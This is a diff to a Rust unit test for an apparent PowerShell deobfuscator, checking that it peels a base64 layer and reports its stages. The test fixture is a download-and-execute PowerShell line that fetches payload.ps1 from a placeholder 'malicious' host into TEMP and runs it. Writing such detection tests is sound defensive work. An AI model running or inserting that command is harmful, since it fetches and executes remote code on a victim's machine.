@@ -68,16 +68,16 @@ mod tests {
 
     #[test]
     fn peels_single_base64_layer() -> Result<()> {
-        let inner: &str = "Invoke-WebRequest -Uri http://malicious/payload.ps1";
+        let inner: &str = "Invoke-WebRequest -Uri http://malicious/payload.ps1 -OutFile $env:TEMP\\payload.ps1; & $env:TEMP\\payload.ps1";
         let b64: String = BASE64_STD.encode(inner);
-        let padded: String = format!("{b64}{}", "A".repeat(120usize.saturating_sub(b64.len())));
-        let wrapped: String = format!("# PowerHell 2026 stub\n{padded}\n");
-        let r: PowerHellReport = reverse_powerhell(&wrapped)?;
         assert!(
-            r.stages
-                .iter()
-                .any(|s: &String| s == "detect-powerhell-banner")
+            b64.len() >= 120,
+            "the payload must encode to a blob the 120-character locator accepts"
         );
+        let wrapped: String = format!("# PowerHell 2026 stub\n{b64}\n");
+        let r: PowerHellReport = reverse_powerhell(&wrapped)?;
+        assert_eq!(r.stages, ["detect-powerhell-banner", "base64-peel"]);
+        assert_eq!(r.output, inner);
         Ok(())
     }
 
